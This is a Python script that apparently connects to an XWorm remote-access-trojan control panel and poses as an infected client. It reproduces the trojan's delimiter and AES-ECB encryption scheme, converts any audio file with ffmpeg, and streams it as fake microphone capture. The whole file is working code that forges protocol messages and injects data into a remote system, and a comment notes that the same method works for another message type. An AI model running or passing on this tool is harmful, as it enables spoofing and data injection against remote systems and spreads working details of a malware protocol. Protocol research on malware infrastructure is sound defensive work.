
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
import subprocess
import hashlib
import base64
import shutil
import socket
import gzip
import time
import io
import os

class MicSpoofingUtils:
    def aes_encryptor(input_bytes, key):
        key_hash = hashlib.md5(key.encode('utf-8')).digest() # MD5 hash of the key
        cipher = AES.new(key_hash, AES.MODE_ECB) # AES cipher in ECB mode
        padded = pad(input_bytes, AES.block_size) # Pad input to block size
        return cipher.encrypt(padded) # Return encrypted bytes

    def send_encrypted(sock, text: str, key: str): 
        encrypted = MicSpoofingUtils.aes_encryptor(text.encode(), key) # Encrypt the text
        header = (str(len(encrypted)) + "\0").encode() # Create header with length
        sock.sendall(header + encrypted) # Send header and encrypted data

    def compress(input_bytes: bytes) -> bytes:
        with io.BytesIO() as memory_stream: # Create memory stream
            memory_stream.write(len(input_bytes).to_bytes(4, byteorder='little')) # Write original length

            with gzip.GzipFile(fileobj=memory_stream, mode='wb') as gzip_file: # Create gzip file
                gzip_file.write(input_bytes) # Write input bytes to gzip file

            return memory_stream.getvalue() # Return compressed bytes


class MicSpoofing:
    SPL_XCLIENT = "<Xwormmm>"

    @staticmethod
    def main():
        if not shutil.which("ffmpeg"): # Check if ffmpeg is installed
            print("ffmpeg is not installed. Please install ffmpeg to use this feature.")
            os._exit(0)
        host = input("Host > ") # Get target host
        port = input("Port > ") # Get target port
        key = input("Key > ") # Get encryption key
        sock = MicSpoofing.connection(host, port) # Connect to target
        audio_path = input("Audio file path > ").strip().strip('"') # Get audio file path

        allowed_exts = (
            ".mp3", ".aac", ".wav", ".flac", ".ogg", ".opus", ".alac",
            ".wma", ".amr", ".ac3", ".dts", ".aiff", ".ape", ".pcm"
        )

        if not os.path.exists(audio_path) or not audio_path.lower().endswith(tuple(allowed_exts)): # Validate audio file
            print("Audio file not found or invalid format.")
            os._exit(0)

        audio_path = os.path.normpath(audio_path) # Normalize path

        MicSpoofing.trigger(sock, key, audio_path) # Trigger the Microphone


    def connection(host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
            sock.connect((host, int(port))) # Connect to target
            print("Connected.") 
            return sock # Return the socket
        except Exception as e:
            print(f"Connection failed: {e}")
            os._exit(0) # Exit on failure

    def trigger(sock, key, audio):
        try:
            payload =  f"MICCM{MicSpoofing.SPL_XCLIENT}MIC Name{MicSpoofing.SPL_XCLIENT}ClientID" 
            MicSpoofingUtils.send_encrypted(sock, payload, key) # Send encrypted message

            raw_pcm = 'audio_swezy.pcm'

            if os.path.exists(raw_pcm):
                os.remove(raw_pcm) # Remove existing PCM file

            subprocess.run([
                'ffmpeg', '-y', '-i', audio,
                '-ar', '8000', '-ac', '1', '-f', 'wav', raw_pcm
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True) # Convert audio to raw PCM

            sample_rate = 8000 # Hz
            bytes_per_sample = 2 # 16-bit audio
            chunk_duration = 0.5 # seconds
            chunk_size = int(sample_rate * bytes_per_sample * chunk_duration) # bytes

            with open(raw_pcm, 'rb') as f: # Open PCM file
                while True: 
                    buf = f.read(chunk_size) # Read chunk
                    if not buf: 
                        break
                    comp = MicSpoofingUtils.compress(buf) # Compress audio chunk
                    b64 = base64.b64encode(comp).decode('utf-8') # Encode to Base64
                    payload = f"MICGET{MicSpoofing.SPL_XCLIENT}{b64}{MicSpoofing.SPL_XCLIENT}{len(buf)}{MicSpoofing.SPL_XCLIENT}ClientID" # Same shit works for "SNDGet"
                    MicSpoofingUtils.send_encrypted(sock, payload, key) # Send encrypted audio buffer
                    print("Audio Buffer sent.") 
                    time.sleep(chunk_duration) # Sleep for chunk duration

                os.remove(raw_pcm) # Remove existing PCM file
        except Exception as e:
            print(f"Failed to send message: {e}")

if __name__ == "__main__":
    MicSpoofing.main() # Run the main function